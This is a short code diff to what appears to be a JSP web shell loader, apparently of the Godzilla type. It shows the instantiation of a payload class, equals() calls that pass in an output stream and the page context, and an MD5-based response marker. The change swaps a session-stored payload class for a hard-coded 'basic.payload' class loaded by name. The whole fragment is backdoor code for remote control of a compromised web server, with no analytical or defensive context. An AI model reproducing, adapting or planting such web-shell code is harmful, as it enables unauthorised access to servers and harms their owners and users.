@@ -78,7 +78,8 @@
         } else {
             request.setAttribute("parameters", data);
             java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
-            Object f = ((Class) session.getAttribute("payload")).newInstance();
+//            Object f = ((Class) session.getAttribute("payload")).newInstance();
+            Object f = ((Class) Class.forName("basic.payload")).newInstance();
             f.equals(arrOut);
             f.equals(pageContext);
             response.getWriter().write(md5.substring(0, 16));
